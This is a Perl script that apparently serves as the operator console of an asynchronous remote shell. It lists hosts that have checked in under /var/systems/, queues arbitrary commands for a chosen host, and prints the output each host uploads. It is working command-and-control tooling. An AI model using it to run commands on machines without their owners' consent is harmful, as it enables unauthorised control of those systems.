#!/usr/bin/perl
#
# async shell-handler client command shell
# GPLv3
# xor-function

use strict;
use File::Path qw(make_path rmtree);

if ($> != 0 ) { die "[!] you must run this as root!\n"; }

sub banner {

	print '[]===========================================================[]'."\n";
	print '[]async shell handler                   command shell ver.02 []'."\n";
	print '[]                                                     GPLv3 []'."\n";
	print '[]===========================================================[]'."\n\n";

}

# main dir is /var/systems/
sub gen_hosts {

	my $hosts_dir = '/var/systems/';
	my @contents = grep -d, <$hosts_dir*>;
	
	return @contents;
}


sub list_hosts { 

	my @hosts = @_;
	my @systems;
	foreach (@hosts) {
		my ($root, $var, $sys, $host) = split '/', $_;
		push @systems, $host; 
	}

	my $value = '0';	
	foreach (@systems) {
		print '[' . $value . ']' . '-> ' . $_ . "\n";
		$value ++
	}
	print "\n";

	my $selection;
	my $opt;

	while (1) {

		print "[*] Select system number you wish to execute commands in.\n";
		$selection = <STDIN>;
		chomp($selection);

		while (1) {

                	if ( $selection !~ /[0-9]/g ) {
                        	print "[!] Thats not a number! Try again.\n";
                        	$selection = <STDIN>;
                        	chomp($selection);
                	}
			elsif (!defined($systems[$selection])) { 
				print "[!] Thats not on the list! Try again.\n";
				$selection = <STDIN>;
				chomp($selection);
			}
			else { last;}

		}

		print "[+] you entered: [ $selection ]\n";
		print "[?] Is this correct? (yes/no)?\n";
		
		$opt = <STDIN>;
		chomp($opt);

		if ($opt =~ /y/i or $opt =~ /yes/i ) {
			last;
		}
		elsif ($opt =~ /n/i or $opt =~ /no/i ) {
			print "[!] Re-enter selection.\n";
		}
		else {  print "[*] Input not understood, re-enter option.\n"; }

	}#end while
		 
	return $systems[$selection];

}

sub proc_cmds {

	my $client = $_[0];
	my $client_path = '/var/systems/' . $client;

	my $command = $client_path . '/command';
	my $stdout = $client_path . '/stdout';

	my $cmd_string;
	my $opt;
	while (1) {
		print "[*] Enter the command you wish to execute in $client.\n";
		print "[!] Warning the async-client does not support running\n";
		print "[!] the same command in a row, this is to prevent an \n";
		print "[!] execution loop.\n\n";
		print "[*] Press Enter when done:\n"; 
		$cmd_string = <STDIN>;
		chomp($cmd_string);

		print "[+] you entered: [ $cmd_string ]\n";
		print "[?] Is this correct? (yes/no)?\n";
		
		$opt = <STDIN>;
		chomp($opt);

		if ($opt =~ /y/i or $opt =~ /yes/i ) {
			last;
		}
		elsif ($opt =~ /n/i or $opt =~ /no/i ) {
			print "[!] Re-enter selection.\n";
		}
		else {  print "[*] Input not understood, re-enter option.\n"; }

	} # end while

	my $lastmod = (stat($stdout))[9];
	my $chkmod  = (stat($stdout))[9];
	
	open (my $fh, '+>', "$command" );
		print $fh "$cmd_string\n";
	close $fh;

	# Test for stability
	if ( $cmd_string =~ /exit/i ) {
		print '[*] Waiting 20 secs for client to receive exit command...' . "\n";
		sleep(20);
		rmtree($client_path);
		# Return "no". Automatically returns shell to selection menu.
		return 'no';

	} else {

		# waiting for client to upload executed command result.
		while ( $lastmod eq $chkmod ) {
			print "[*] Waiting for response from client...\n";
			$chkmod = (stat($stdout))[9];
			sleep(4);
		}

		# Reading Response
		print "[+] Got Response!\n";
		open(my $rfh, '<', "$stdout");
			while (<$rfh>) { print $_; }
		close $rfh;
	
		undef $opt;
		while (1) {

			print "[*] Do you wish to execute another command?\n";
			print "[*] Or select another client? [yes/no]\n";

                	$opt = <STDIN>;
                	chomp($opt);

                	if ($opt =~ /y/i or $opt =~ /yes/i ) {
                        	last;
               		}
                	elsif ($opt =~ /n/i or $opt =~ /no/i ) {
                        	print "[!] exiting to selection menu...\n";
				return 'no';
				last;
                	} else {  print "[*] Input not understood, re-enter option.\n"; }
                	

		} # end while

	}


}

sub main {

	while (1) {

		while (!gen_hosts()) {
			print "[!] No client has reported in yet, waiting...\n";
			sleep(5);
		}

		print "[!] Avaliable hosts running the async-client.\n\n";
		my @sys_hosts = gen_hosts();
		my $client = list_hosts(@sys_hosts);

		while (1) { 
			my $choice = proc_cmds($client);
			if ( $choice eq 'no' ) { last; } 
		}

	}# end while  

} 


banner();
main();
exit(0);
